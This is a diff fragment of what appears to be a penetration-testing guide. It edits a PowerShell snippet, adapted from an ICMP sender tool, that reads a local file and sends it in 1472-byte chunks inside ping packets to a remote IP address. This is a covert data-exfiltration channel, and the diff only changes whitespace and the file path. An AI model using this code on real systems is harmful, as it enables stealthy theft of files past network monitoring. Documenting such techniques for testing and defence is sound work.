@@ -31,17 +31,17 @@ A good option for recent Windows based systems is a modified [Powershell-ICMP-Se
     $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
     $PingOptions.DontFragment = $true
     #$PingOptions.Ttl = 10
-    
+
     # Must be divided into 1472 chunks
     [int]$bufSize = 1472
-    $inFile = "C:\Users\bob\Desktop\backup.zip"
-    
+    $inFile = "C:\Users\bob\Desktop\backfile"
+
 
     $stream = [System.IO.File]::OpenRead($inFile)
     $chunkNum = 0
     $TotalChunks = [math]::floor($stream.Length / 1472)
     $barr = New-Object byte[] $bufSize
-    
+
     # Start of Transfer
     $sendbytes = ([text.encoding]::ASCII).GetBytes("^BOFbackup.zip")
     $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
@@ -50,7 +50,7 @@ A good option for recent Windows based systems is a modified [Powershell-ICMP-Se
     while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
         $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
         $ICMPClient.PingCompleted
-        
+
         #Missing check if transfer is okay, added sleep.
         sleep 2
         #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
